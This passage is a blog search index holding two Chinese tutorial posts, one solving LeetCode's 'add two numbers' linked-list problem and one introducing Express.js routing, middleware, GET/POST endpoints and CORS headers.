<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>LeetCode算法训练</title>
    <link href="/2022/11/10/LeetCode%E7%AE%97%E6%B3%95%E8%AE%AD%E7%BB%83/"/>
    <url>/2022/11/10/LeetCode%E7%AE%97%E6%B3%95%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="LeetCode算法训练"><a href="#LeetCode算法训练" class="headerlink" title="LeetCode算法训练"></a>LeetCode算法训练</h1><h2 id="1-两数相加"><a href="#1-两数相加" class="headerlink" title="1.两数相加"></a>1.两数相加</h2><p>给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。</p><p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p><p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">输入：l1 = [<span class="hljs-number">9,9,9,9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>,<span class="hljs-number">9</span>], l2 = [<span class="hljs-number">9,9,9,9</span>]<br>输出：[<span class="hljs-number">8,9,9,9</span>,<span class="hljs-number">0,0,0,1</span>]<br>解释：<span class="hljs-number">9999999</span> + <span class="hljs-number">9999</span> = <span class="hljs-number">10009998</span><br></code></pre></td></tr></table></figure><p>分析：</p><p>首先我们的任务是循环遍历链表，将两个链表的每一个元素相加</p><p>但是有几个问题需要解决：</p><p>1、两个链表的长度不一定一样，需要以长链表为准，在短链表后添加0</p><p>2、进位问题</p><p>3、进位之后的数据处理</p><p>链表结构</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">class</span> addListNode &#123;<br> <span class="hljs-built_in">int</span> <span class="hljs-keyword">val</span>;<br>      addListNode next;<br>      add<span class="hljs-constructor">ListNode()</span> &#123;&#125;<br>      add<span class="hljs-constructor">ListNode(<span class="hljs-params">int</span> <span class="hljs-params">val</span>)</span> &#123; this.<span class="hljs-keyword">val</span> = <span class="hljs-keyword">val</span>; &#125;<br>      add<span class="hljs-constructor">ListNode(<span class="hljs-params">int</span> <span class="hljs-params">val</span>, <span class="hljs-params">addListNode</span> <span class="hljs-params">next</span>)</span> &#123; this.<span class="hljs-keyword">val</span> = <span class="hljs-keyword">val</span>; this.next = next; &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>第一步：遍历相加，判断进位</p><p>其中cur是进位数字，sum/10之后得到的就是需要加到下一位上面的数字</p><p>然后sum再取余，得到的数据装入链表</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta">        <span class="hljs-keyword">while</span>(l1!= <span class="hljs-literal">null</span> || l2!=<span class="hljs-literal">null</span>)&#123;<br><span class="hljs-comment">//                使得长度相等</span><br>                <span class="hljs-built_in">int</span> x = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;<br>                <span class="hljs-built_in">int</span> y = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;<br>                <span class="hljs-keyword">sum</span> = x+y+cur;<br><span class="hljs-comment">//                进位符</span><br>                cur = <span class="hljs-keyword">sum</span>/<span class="hljs-number">10</span>;<br><span class="hljs-comment">//                sum只能是1-9的数</span><br>                <span class="hljs-keyword">sum</span> = <span class="hljs-keyword">sum</span>%<span class="hljs-number">10</span>;<br><br><span class="hljs-comment">//               装入链表</span><br>                pre.<span class="hljs-keyword">next</span> = <span class="hljs-keyword">new</span> addListNode(<span class="hljs-keyword">sum</span>);<br>                pre = pre.<span class="hljs-keyword">next</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>最后进行最后一位的进位判断，如例子中得到了进位1</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span>(cur<span class="hljs-operator"> == </span><span class="hljs-number">1</span>)&#123;<br>    pre.next = <span class="hljs-keyword">new</span> add<span class="hljs-constructor">ListNode(<span class="hljs-params">cur</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后返回链表指针</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">return</span> one.<span class="hljs-keyword">next</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>express</title>
    <link href="/2022/11/07/express/"/>
    <url>/2022/11/07/express/</url>
    
    <content type="html"><![CDATA[<h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><p>express是基于http封装出来的，极大提升了我们服务端的开发进度</p><p>使用： 安装</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">npm install <span class="hljs-symbol">express@</span>版本号<br></code></pre></td></tr></table></figure><p>然后新建一个index.js文件</p><p>进行监听get请求：</p><p>请求之后使用send发送信息给客户端</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><br>const app = <span class="hljs-keyword">new</span> express()<br><br>const port = <span class="hljs-number">3000</span><br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span>=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;hello world!&#x27;</span>)<br>&#125;)<br><br>app.listen(port, <span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listen port 3000&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>我们发现这些方法的使用和原生的http模块其实很类似</p><p>send方法响应一个字符串，也可以响应一个json对象</p><h2 id="1-常用api"><a href="#1-常用api" class="headerlink" title="1.常用api"></a>1.常用api</h2><h3 id="1-1-static"><a href="#1-1-static" class="headerlink" title="1.1 static"></a>1.1 static</h3><p>将静态资源向外展示，现在将public中的资源向外开放</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 向外展示静态资源<br><span class="hljs-regexp">//</span> static中的便是需要展示的文件夹<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>))<br></code></pre></td></tr></table></figure><p>但是我们访问public下的资源时不需要加<code>/public</code></p><p>而是直接使用public下的相对路径就可以了</p><h3 id="1-2-nodemon"><a href="#1-2-nodemon" class="headerlink" title="1.2 nodemon"></a>1.2 nodemon</h3><p>一个类似于热重载的插件</p><p><code>npm install -g nodemon</code>全局安装nodemon</p><p>安装完毕之后 使用<code>nodemon 文件名</code>启动项目</p><p>之后每次代码变动，只要ctrl+s就会自动重载代码</p><h3 id="1-3-路由"><a href="#1-3-路由" class="headerlink" title="1.3 路由"></a>1.3 路由</h3><p>路由就是客户端输入什么路径，我们就返回该路径下的文件即页面</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">app.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span>=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;hello world!&#x27;</span>)<br>&#125;)<br><br>app.post(<span class="hljs-string">&#x27;/user&#x27;</span>,<span class="hljs-function"><span class="hljs-params">(req, res)</span>=&gt;</span>&#123;<br>    res.send(&#123;<span class="hljs-string">&#x27;user&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>但是我们一般使用的都是封装之后的模块化路由</p><p>建立一个router.js</p><p>获取Router的实例对象，重写方法，然后暴露出去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><br><span class="hljs-comment">// 实例化一个router对象</span><br><span class="hljs-keyword">const</span> router = express.Router()<br><br>router.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&quot;you got get&quot;</span>)<br>&#125;)<br><br>router.post(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&quot;you got post&quot;</span>)<br>&#125;)<br><br><br><span class="hljs-comment">// 暴露出去</span><br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure><p>之后在index.js中引用这个模块</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//引入路由</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./router&#x27;</span>) <br><span class="hljs-comment">//使用路由</span><br>app.<span class="hljs-keyword">use</span>(router)<br></code></pre></td></tr></table></figure><p>然后访问<code>3000/user</code>，得到和之前一样的效果</p><h2 id="2-中间件"><a href="#2-中间件" class="headerlink" title="2. 中间件"></a>2. 中间件</h2><p>express中的中间件用于处理请求，请求达到express服务器的时候，我们调用一个中间件，将结果作为输入传到第二个中间件</p><p>而触发链式调用的函数就是我们的<code>next()</code>（用于流转关系）</p><h3 id="2-1-全局中间件"><a href="#2-1-全局中间件" class="headerlink" title="2.1 全局中间件"></a>2.1 全局中间件</h3><p>一个简单的中间件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><br><span class="hljs-keyword">const</span> app = express()<br><br><span class="hljs-comment">// 定义一个简单的中间件</span><br><span class="hljs-keyword">const</span> mv = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;中间件函数&quot;</span>);<br><span class="hljs-comment">// next传递到下一个中间件</span><br>    next()<br>&#125;<br><br><span class="hljs-comment">// 使用app.use 设置为全局中间件</span><br>app.use(mv)<br><br>app.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;got you&#x27;</span>)<br>&#125;)<br><br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>然后我们访问<code>/user</code>的时候服务器就会打印mv回调中的内容</p><p>注意<strong>中间件一定要写在路由前面</strong></p><p>多个中间件</p><p>按照app.use的定义顺序进行调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><br><span class="hljs-keyword">const</span> app = express()<br><br><span class="hljs-comment">// 定义一个简单的中间件</span><br><span class="hljs-keyword">const</span> mv1 = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;中间件函数1&quot;</span>);<br><span class="hljs-comment">// next传递到下一个中间件或者路由</span><br>    next()<br>&#125;<br><br><span class="hljs-keyword">const</span> mv2 = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;中间件函数2&quot;</span>);<br>    next()<br>&#125;<br><br><span class="hljs-comment">// 使用app.use 设置为全局中间件</span><br>app.use(mv1,mv2)<br><br>app.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;got you&#x27;</span>)<br>&#125;)<br><br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="2-2-局部中间件"><a href="#2-2-局部中间件" class="headerlink" title="2.2 局部中间件"></a>2.2 局部中间件</h3><p>定义局部中间件，我们就不再使用app.use而是直接将中间件<strong>加入路由的第二个参数中</strong></p><p>同样，写入的顺序也会影响中间件的调用顺序</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mv1 = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;中间件函数1&quot;</span>);<br><span class="hljs-comment">// next传递到下一个中间件或者路由</span><br>    next()<br>&#125;<br><br><span class="hljs-keyword">const</span> mv2 = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;中间件函数2&quot;</span>);<br>    next()<br>&#125;<br><br><br>app.get(<span class="hljs-string">&#x27;/user&#x27;</span>, mv2, mv1, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;got you&#x27;</span>)<br>&#125;)<br><br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p><strong>注意事项：</strong></p><p>1.一定要在路由之前注册中间件，也就是中间件必须卸载中间件后面</p><p>2.客户端发来的请求，可以经过多个中间件</p><p>3.执行完业务代码，要调用next()</p><p>4.对于优先级来说，<strong>全局中间件的调用顺序是优先于局部中间件的</strong></p><p>5.为了防止逻辑混乱，next之后不写其他代码</p><p>6.多个中间件之间，<strong>共享res和req对象</strong></p><h3 id="2-3-中间件的分类"><a href="#2-3-中间件的分类" class="headerlink" title="2.3  中间件的分类"></a>2.3  中间件的分类</h3><p>应用级别的中间件：</p><p>通过app.use，app.get/post，绑定在app实例上的中间件</p><p>路由级别的中间件：</p><p>绑定到<code>express.Router()</code>上的中间件</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">const</span> <span class="hljs-keyword">app</span> = express()<br><br><span class="hljs-keyword">const</span> router = express.Router()<br><br><span class="hljs-comment">// 路由中间件</span><br>router.<span class="hljs-keyword">use</span>(function (req, res, next) &#123;<br>    console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;路由中间件&quot;</span>);<br>    next()<br>&#125;)<br><br><span class="hljs-keyword">app</span>.<span class="hljs-keyword">use</span>(router)<br></code></pre></td></tr></table></figure><p>而且<strong>路由中间件的优先级高于应用中间件</strong></p><p>错误级别的中间件：</p><p>错误级别的中间件函数第一个参数是err，代表错误</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><br>const app = express()<br><br><span class="hljs-regexp">//</span> 路由<br>app.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;500&#x27;</span>)<br>    res.send(<span class="hljs-string">&#x27;got you&#x27;</span>)<br>&#125;)<br><br><span class="hljs-regexp">//</span> 错误级别中间件，捕获异常，防止崩溃<br>app.use(<span class="hljs-function"><span class="hljs-params">(err, req, res, next)</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;发生了错误&quot;</span>+err.message);<br>    res.send(<span class="hljs-string">&quot;Error!&quot;</span>+err.message)<br>&#125;)<br><br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>错误级别的中间件最好放在所有路由之后，以便捕获错误</p><p>内置中间件：</p><p>分别是express.static：管理静态资源的中间件</p><p>​            express.json：解析json的中间件</p><p>​            express.urlencoded：解析URL -encoded的中间件</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">app.use(express.json())<br><br><span class="hljs-regexp">//</span> 路由<br>app.post(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span>=&gt;</span>&#123;<br>    res.send(<span class="hljs-string">&#x27;got you&#x27;</span>)<br>    <span class="hljs-built_in">console</span>.log(req.body);<br>&#125;)<br></code></pre></td></tr></table></figure><p>在我们的req方法中有对应的header和body，分别用于获取请求头数据和请求体数据</p><p>得到的就是一个JSON解析过后的对象数据</p><p>如果得到的结果是<code>undefined</code>，就是数据解析没有成功，有可能是app.use写在了路由后面</p><p>还有一些<strong>第三方中间件</strong>，npm安装，require获取，app.use()注册</p><p>自定义中间件：</p><p>现在我们自己来实现一下中间件效果，中间件其实就是一个类似守卫或者说过滤器一般的效果</p><p>首先新建一个中间件<code>app.use((req, res, next) =&gt; &#123;&#125;)</code></p><p>请求到达开始，监听req的data事件</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-comment">// 监听req的data事件</span><br>let <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>req.on(<span class="hljs-string">&#x27;data&#x27;</span>, (chunk)=&gt;&#123;<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span> + chunk<br>&#125;)<br></code></pre></td></tr></table></figure><p>然后在请求结束的时候，进行数据解析</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 监听req的end事件</span><br>req<span class="hljs-selector-class">.on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, ()=&gt;&#123;<br>    <span class="hljs-comment">// 解析str为对象，适用于encode，对于json会有问题</span><br>    <span class="hljs-comment">// const body = qs.parse(str)</span><br><br>    <span class="hljs-comment">// 为JSON数据的时候直接使用JSON.parse</span><br>    const <span class="hljs-selector-tag">body</span> = JSON<span class="hljs-selector-class">.parse</span>(str)<br>    req<span class="hljs-selector-class">.body</span> = <span class="hljs-selector-tag">body</span><br>    console<span class="hljs-selector-class">.log</span>(req<span class="hljs-selector-class">.body</span>.name)<br>    next()<br>&#125;)<br></code></pre></td></tr></table></figure><p>因为中间件和路由共享同一个req和res，所以我们自定义中间件的效果就实现了</p><p>注意！！！ next一定要放在on函数里面，不然路由中req.body中的内容会为空</p><p><strong>这是因为on函数执行顺序的问题，在路由中，on函数外面的代码优先执行</strong></p><h2 id="3-接口编写"><a href="#3-接口编写" class="headerlink" title="3. 接口编写"></a>3. 接口编写</h2><p>我们在学习了请求和路由之后下一步就是接口编写</p><p>我们的接口一般专门写在一个js文件中，然后模块暴露出去</p><h3 id="1-get接口"><a href="#1-get接口" class="headerlink" title="1. get接口"></a>1. get接口</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> express.Router()<br><br><span class="hljs-comment">// 创建路由</span><br>router.get(<span class="hljs-string">&#x27;/user&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;this is user&#x27;</span>);<br>    res.end()<br>&#125;)<br><br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure><p>服务器中使用<code>app.use</code>创建一个api路由，作为一级路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;./apiRouter&#x27;</span>)<br><br><span class="hljs-comment">// app.use除了全局定义路由，还有app.get等的效果</span><br>app.<span class="hljs-keyword">use</span>(<span class="hljs-string">&#x27;/api&#x27;</span>, router)<br></code></pre></td></tr></table></figure><p>如果我们需要访问到路由中的内容就需要访问路径<code>/api/user</code></p><h3 id="req-query："><a href="#req-query：" class="headerlink" title="req.query："></a>req.query：</h3><p>query，params，body分别用于获取get和post的请求参数</p><p>query和params的区别在于</p><p>query是直接获取参数：</p><p><code>const query = req.query</code></p><p>params需要添加占位符：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">app.get(<span class="hljs-string">&#x27;/api/getUserListById/:id&#x27;</span>, <span class="hljs-function"><span class="hljs-params">(req, res)</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;id is:&#x27;</span> + req.params.id);<br>&#125;)<br></code></pre></td></tr></table></figure><p>是用这个参数，我们可以让服务器返回请求的信息</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">// 创建路由<br>router.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, (req, <span class="hljs-keyword">res</span>)=&gt;&#123;<br>    //获取<span class="hljs-built_in">get</span>请求参数<br>    const query = req.query<br>    // 发送数据回去<br>    <span class="hljs-keyword">res</span>.send(&#123;<br>        statu<span class="hljs-variable">s:</span> <span class="hljs-number">0</span>,<br>        ms<span class="hljs-variable">g:</span> <span class="hljs-string">&#x27;get 请求成功&#x27;</span>,<br>        dat<span class="hljs-variable">a:</span> query<br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="2-post接口"><a href="#2-post接口" class="headerlink" title="2. post接口"></a>2. post接口</h3><p>和get类似</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//创建post路由</span><br>router<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, (req, res)=&gt;&#123;<br>    <span class="hljs-comment">// 获取请求体</span><br>    const <span class="hljs-selector-tag">body</span> = req<span class="hljs-selector-class">.body</span><br>    <span class="hljs-comment">// let body = JSON.parse(json)</span><br>    <span class="hljs-comment">// 发送数据</span><br>    res<span class="hljs-selector-class">.send</span>(&#123;<br>        status: <span class="hljs-number">0</span>,<br>        msg: <span class="hljs-string">&#x27;post 请求成功&#x27;</span>,<br>        data: <span class="hljs-selector-tag">body</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>但是post数据一般是经过encode或者JSON处理过的</p><p>所以需要在index.js中调用一下编码</p><p><code>app.use(express.urlencoded(&#123;extended:false&#125;))</code></p><h3 id="3-跨域问题（协议，域名，端口号任何一项不同都会触发）"><a href="#3-跨域问题（协议，域名，端口号任何一项不同都会触发）" class="headerlink" title="3.跨域问题（协议，域名，端口号任何一项不同都会触发）"></a>3.跨域问题（协议，域名，端口号任何一项不同都会触发）</h3><p>如果我们这个时候使用前端给index.js发送请求，就会出现跨域问题</p><p>所以我们在路由中加上这样的代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>设置请求头<br>res.setHeader(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还可以通过</p><figure 